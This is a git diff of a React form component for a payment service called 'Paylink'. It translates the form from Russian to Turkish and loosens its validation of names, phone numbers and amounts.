@@ -2,7 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import axios from 'axios';
 import LogotypeTextImage from './img/LogotypeText.png';
-import TerminalSecImage from './img/terminalru.png';
+import TerminalSecImage from './img/act.png';
 import CardImage from './img/card.png';
 import FastsystemImage from './img/spb.png';
 
@@ -30,16 +30,16 @@ const Form = () => {
   }, [location.state]);
 
   const validateName = (name) => {
-    const regex = /^[А-Яа-я]+\s[А-Яа-я]+$/;
+    const regex = /^[A-Za-zçşığüöÇŞİĞÜÖ]+\s[A-Za-zçşığüöÇŞİĞÜÖ]+$/; // Türkçe karakterler de dahil
     return regex.test(name.trim());
   };
 
   const validatePhoneNumber = (phoneNumber) => {
-    return /^\+79\d{9}$/.test(phoneNumber);
+    return /^\+\d+$/.test(phoneNumber);
   };
 
   const validateAmount = (amount) => {
-    return amount >= 500 && amount <= 100000;
+    return amount >= 99 && amount <= 100000;
   };
 
   const validateClientNumber = (clientNumber) => {
@@ -52,26 +52,20 @@ const Form = () => {
     let newErrors = { ...errors };
 
     if (name === 'name' && !validateName(updatedValue)) {
-      newErrors.name = 'Имя и фамилия должны быть на русском и с большой буквы';
+      newErrors.name = 'Ad ve soyad İngilizce ve büyük harfle başlamalı';
     } else if (name === 'phoneNumber') {
-      if (updatedValue.startsWith('9')) {
-        updatedValue = `+79${updatedValue.slice(1)}`;
-      } else if (updatedValue.startsWith('7')) {
-        updatedValue = `+7${updatedValue.slice(1)}`;
-      } else if (!updatedValue.startsWith('+7')) {
-        newErrors.phoneNumber = 'Номер телефона должен быть в формате +7XXXXXXXXXX';
-      } else {
-        delete newErrors.phoneNumber;
+      if (!updatedValue.startsWith('+')) {
+        updatedValue = `+${updatedValue}`;
       }
       if (!validatePhoneNumber(updatedValue)) {
-        newErrors.phoneNumber = 'Номер телефона должен быть в формате +7XXXXXXXXXX';
+        newErrors.phoneNumber = 'Telefon numarası +XXXXXXXXXXXX formatında olmalı';
       } else {
         delete newErrors.phoneNumber;
       }
     } else if (name === 'amount' && !validateAmount(updatedValue)) {
-      newErrors.amount = 'Сумма должна быть в пределах от 500 до 100000 рублей';
+      newErrors.amount = 'Tutar 99 ve 100000 TL arasında olmalı';
     } else if (name === 'clientNumber' && !validateClientNumber(updatedValue)) {
-      newErrors.clientNumber = 'Промокод должен содержать от 3 до 6 цифр';
+      newErrors.clientNumber = 'Promo kodu 3 ila 6 rakam içermeli';
     } else {
       delete newErrors[name];
     }
@@ -94,15 +88,19 @@ const Form = () => {
       try {
         const response = await axios.post('/api/db/form', formData);
         const { cardChoice } = formData;
+        
+        // Сохраняем ID формы в localStorage
+        localStorage.setItem('formId', response.data._id);
+  
         if (cardChoice === 'card1') {
           navigate('/orderspb', { state: { id: response.data._id } });
         } else if (cardChoice === 'card2') {
-          navigate('/order', { state: { id: response.data._id } });
+          navigate('/ordertur', { state: { id: response.data._id } });
         } else if (cardChoice === 'card3') {
-          navigate('/orderother', { state: { id: response.data._id } });
+          navigate('/orderothereng', { state: { id: response.data._id } });
         }
       } catch (error) {
-        console.error('Error submitting form:', error.message);
+        console.error('Form gönderim hatası:', error.message);
       }
     } else {
       setTouchedFields({
@@ -144,7 +142,7 @@ const Form = () => {
           <form onSubmit={handleSubmit} className="flex flex-col items-center text-grayth">
             <div className="mb-6 w-full flex flex-col items-center">
               <label htmlFor="name" className="block mr-5 font-normal text-gray-700 w-full md:max-w-md max-w-[320px] md:ml-0 ml-6 text-left">
-                Имя Фамилия
+                Adınız ve Soyadınız
               </label>
               <input
                 type="text"
@@ -155,13 +153,12 @@ const Form = () => {
                 onBlur={handleBlur}
                 className={`mt-1 block w-full md:max-w-[470px] max-w-[320px] h-[35px]  border ${touchedFields.name || formData.name ? 'bg-white border-neutral-700' : 'bg-gray-form border-gray-200'} rounded-md shadow-sm p-2 hover:shadow-md focus:bg-white focus:border-neutral-700 focus:outline-none`}
                 required
-                
               />
               {errors.name && <p className="text-red-500 text-sm">{errors.name}</p>}
             </div>
             <div className="mb-6 w-full flex flex-col items-center">
               <label htmlFor="phoneNumber" className="block mr-5 font-normal text-gray-700 w-full md:max-w-md max-w-[320px] md:ml-0 ml-6 text-left">
-                Номер телефона
+                Telefon Numarası
               </label>
               <input
                 type="text"
@@ -171,16 +168,13 @@ const Form = () => {
                 onChange={handleChange}
                 onBlur={handleBlur}
                 className={`mt-1 block w-full md:max-w-[470px] max-w-[320px] h-[35px]  border ${touchedFields.phoneNumber || formData.phoneNumber ? 'bg-white border-neutral-700' : 'bg-gray-form border-gray-200'} rounded-md shadow-sm p-2 hover:shadow-md focus:bg-white focus:border-neutral-700 focus:outline-none`}
-                pattern="\+79\d{9}"
-                title="Номер телефона должен быть в формате +7XXXXXXXXXX"
                 required
-                
               />
               {errors.phoneNumber && <p className="text-red-500 text-sm">{errors.phoneNumber}</p>}
             </div>
             <div className="mb-6 w-full flex flex-col items-center">
               <label htmlFor="amount" className="block mr-5 font-normal text-gray-700 w-full md:max-w-md max-w-[320px] md:ml-0 ml-6 text-left">
-                Сумма сделки в рублях
+                İşlem Tutarı (TL)
               </label>
               <input
                 type="number"
@@ -190,14 +184,14 @@ const Form = () => {
                 onChange={handleChange}
                 onBlur={handleBlur}
                 className={`mt-1 block w-full md:max-w-[470px] max-w-[320px] h-[35px]  border ${touchedFields.amount || formData.amount ? 'bg-white border-neutral-700' : 'bg-gray-form border-gray-200'} rounded-md shadow-sm p-2 hover:shadow-md focus:bg-white focus:border-neutral-700 focus:outline-none`}
+                placeholder=""
                 required
-                
               />
               {errors.amount && <p className="text-red-500 text-sm">{errors.amount}</p>}
             </div>
             <div className="mb-12 w-full flex flex-col items-center">
               <label htmlFor="clientNumber" className="block mr-5 font-normal text-gray-700 w-full md:max-w-md max-w-[320px] md:ml-0 ml-6 text-left">
-                Промокод (необязательно)
+                Promo Kodu (Opsiyonel)
               </label>
               <input
                 type="number"
@@ -208,13 +202,12 @@ const Form = () => {
                 onBlur={handleBlur}
                 className={`mt-1 block w-full md:max-w-[470px] max-w-[320px] h-[35px] max-w-md border ${touchedFields.clientNumber || formData.clientNumber ? 'bg-white border-neutral-700' : 'bg-gray-form border-gray-200'} rounded-md shadow-sm p-2 hover:shadow-md focus:bg-white focus:border-neutral-700 focus:outline-none`}
                 max="999999"
-                
               />
               {errors.clientNumber && <p className="text-red-500 text-sm">{errors.clientNumber}</p>}
             </div>
-            <div className="mb-2 w-full flex items-center justify-between w-full md:max-w-[470px] max-w-[320px]" >
+            <div className="mb-2 w-full flex items-center justify-between w-full md:max-w-[470px] max-w-[320px]">
               <label htmlFor="agreement" className="block font-normal text-gray-700 w-[80%]">
-                Подтверждаете пользовательское соглашение?
+                Kullanıcı sözleşmesini kabul ediyor musunuz?
               </label>
               <label className="switch">
                 <input
@@ -228,30 +221,29 @@ const Form = () => {
                 <span className="slider round"></span>
               </label>
             </div>
-            <div className="mb-4 w-full flex text-sm w-full md:max-w-[470px] max-w-[320px]" >
+            <div className="mb-4 w-full flex text-sm w-full md:max-w-[470px] max-w-[320px]">
               <a href="/path-to-user-agreement" className="text-blueth hover:underline">
-                Нажмите для просмотра договора аферты...
+                Kullanıcı sözleşmesini görüntülemek için buraya tıklayın...
               </a>
             </div>
             <button
               type="submit"
               className="bg-grayth mt-4 w-full md:max-w-[470px] max-w-[320px] h-[50px] font-base font-bold text-white py-2 px-4 rounded-lg hover:bg-purple-950"
-              
             >
-              Перейти к следующему шагу
+              Bir Sonraki Adıma Geç
             </button>
           </form>
         </div>
-
+    
         <div className="absolute bottom-0 left-1/2 transform -translate-x-1/2 md:mb-4 mb-8 text-center w-[340px]">
           <p className="text-xs text-gray-500 mb-3">
-            Добро пожаловать на сервис платежей в интернете "Пейлинк"! Заполните Ваши персональные данные и объем желаемых вложений. Все права защищены!
+            Çevrimiçi ödeme hizmetine "Paylink"e hoş geldiniz! Lütfen kişisel bilgilerinizi ve istenen yatırım tutarını doldurun. Tüm hakları saklıdır!
           </p>
           <img src={LogotypeTextImage} alt="Paylink" className="mx-auto mb-6 w-[122px] h-[46px]" />
         </div>
       </div>
     </div>
-  );
-};
+    
+  ); };
 
-export default Form;
+  export default Form;
